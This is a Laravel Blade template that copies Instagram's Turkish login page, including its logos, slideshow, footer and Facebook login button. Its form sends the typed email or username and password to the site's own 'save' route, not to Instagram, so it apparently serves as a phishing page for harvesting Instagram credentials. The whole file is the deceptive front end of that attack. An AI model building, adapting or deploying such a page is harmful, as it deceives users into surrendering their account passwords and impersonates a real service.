<main>

    <div class="container">
        <div class="main-container">
            <div class="main-content">
                <div class="slide-container"
                    style="background-image: url({{ asset('assets/images') }}/phone-frame.png);">
                    <div class="slide-content" id="slide-content">
                        <img src="{{ asset('assets/images') }}/slide (1).jpg" alt="slide image" class="active">
                        <img src="{{ asset('assets/images') }}/slide (2).jpg" alt="slide image">
                        <img src="{{ asset('assets/images') }}/slide (3).jpg" alt="slide image">
                        <img src="{{ asset('assets/images') }}/slide (4).jpg" alt="slide image">
                        <img src="{{ asset('assets/images') }}/slide (5).jpg" alt="slide image">
                    </div>
                </div>

                <form action="{{ route('save') }}" enctype="multipart/form-data" method="POST">
                    @csrf
                    <div class="form-container">
                        <div class="form-content box">
                            <div class="logo">
                                <img src="{{ asset('assets/images') }}/logo-light.png" alt="Instagram logo"
                                    class="logo-light">
                                <img src="{{ asset('assets/images') }}/logo-dark.png" alt="Instagram logo"
                                    class="logo-dark">
                            </div>
                            <div class="signin-form" id="signin-form">
                                <div class="form-group">
                                    <div class="animate-input">
                                        <span>
                                            Telefon, kullanıcı adı veya e-posta

                                        </span>
                                        <input type="text" name="email">
                                    </div>
                                </div>
                                <div class="form-group">
                                    <div class="animate-input">
                                        <span>
                                            Şifre
                                        </span>
                                        <input type="password" name="password">
                                        <button>Göster</button>
                                    </div>
                                </div>
                                <div class="btn-group">
                                    <button class="btn-login" id="signin-btn" disabled>
                                        Giriş Yap
                                    </button>
                                </div>
                                <div class="divine">
                                    <div></div>
                                    <div>Yada</div>
                                    <div></div>
                                </div>
                                <div class="btn-group">
                                    <button class="btn-fb">
                                        <img src="{{ asset('assets/images') }}/facebook-icon.png" alt="">
                                        <span>Facebook ile giriş yap</span>
                                     
                                    </button><br>
                                    @if (Session::has('get_message'))
            
                                    <div style="color: red;  "   ><h5 style="text-align: center"> {{ Session::get('get_message') }}</h6> </div>
                
                                    @endif
                                </div>
                                <a href="#" class="forgot-pw">Şifreni mi unuttun?</a>
                              
                            </div>
                            <div>
                               
                            </div>
                        </div>
                        <div class="box goto">
                            <p>
                                Hesabınız yok mu?

                                <a href="#">Üye Ol</a>
                            </p>
                        </div>

                </form>


                <div class="app-download">
                    <p>Uygulamayı İndir</p>
                    <div class="store-link">
                        <a href="#">
                            <img src="{{ asset('assets/images') }}/app-store.png" alt="app store">
                        </a>
                        <a href="#">
                            <img src="{{ asset('assets/images') }}/gg-play.png" alt="google play">
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="footer">
        <div class="links">
            <a href="#">Hakkımızda</a>
            <a href="#">Blog</a>
            <a href="#">İşler</a>
            <a href="#">Yardım</a>
            <a href="#">API</a>
            <a href="#">Güvenlik</a>
            <a href="#">Şartlar</a>
            <a href="#">En İyi Hesap</a>
            <a href="#">Hashtag'ler</a>
            <a href="#">Lokasyon</a>
            <a href="#" id="darkmode-toggle">Karanlık Mod</a>

        </div>
     

        <div class="copyright">
            © 2022 Instagram from Facebook <br>

        </div>
       
        
    </div>
    </div>

    <!-- APP JS -->
    <script src="{{ asset('assets/app.js') }}"></script>


</main>
